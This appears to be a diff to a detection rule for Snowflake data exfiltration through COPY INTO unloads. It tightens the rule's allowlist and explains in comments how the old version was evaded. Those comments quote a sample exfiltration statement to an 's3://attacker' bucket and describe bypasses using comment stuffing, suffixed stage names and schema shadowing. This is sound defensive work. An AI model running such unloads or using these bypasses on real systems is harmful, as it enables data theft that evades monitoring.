@@ -21,7 +21,7 @@ references:
   - https://github.com/dotgibson/htpx/blob/main/entries/blue/snowflake-exfil-audit.md
 author: dotfiles-Defense
 date: 2026-07-02
-modified: 2026-09-28
+modified: 2026-09-29
 tags:
   - attack.exfiltration
   - attack.t1567.002
@@ -50,9 +50,19 @@ detection:
     # ANCHORED like filter_internal_stages above, one entry per destination: a `contains`
     # here was satisfied by the stage name in a SQL comment, so
     # `COPY INTO 's3://attacker/x' FROM t /* MY_SANCTIONED_STAGE */` passed as sanctioned.
-    # Write each entry as the statement starts, e.g. `COPY INTO 's3://sanctioned-bucket/`.
+    # Write each entry as the statement starts, e.g. `COPY INTO 's3://sanctioned-bucket/`,
+    # and END it with a delimiter: without one, `@...MY_SANCTIONED_STAGE` also exempts
+    # `@...MY_SANCTIONED_STAGE_EVIL`. A stage takes TWO entries - the path form (`@STAGE/`)
+    # and the stage-root form (`@STAGE ` with a trailing space, as in
+    # `COPY INTO @STAGE FROM t`) - plus a newline form if your SQL breaks the line there.
+    # Write the stage FULLY QUALIFIED (`@DB.SCHEMA.STAGE`) and make your jobs use that
+    # form: an unqualified name resolves in the session's current schema, so anyone who
+    # can create a stage of the same name in a schema of their own (pointing at their
+    # bucket) inherits the exemption. Alert separately on CREATE/ALTER STAGE naming an
+    # allowlisted stage.
     query_text|startswith:
-      - 'COPY INTO @MY_SANCTIONED_STAGE'   # example — replace with your known-good stages
+      - 'COPY INTO @MY_DB.MY_SCHEMA.MY_SANCTIONED_STAGE/'   # example — replace with your stages
+      - 'COPY INTO @MY_DB.MY_SCHEMA.MY_SANCTIONED_STAGE '   # example — same stage, root unload
   condition: selection_unload and not 1 of filter_*
 falsepositives:
   - Unloads to a named INTERNAL stage (not `@%`/`@~`) - indistinguishable from external
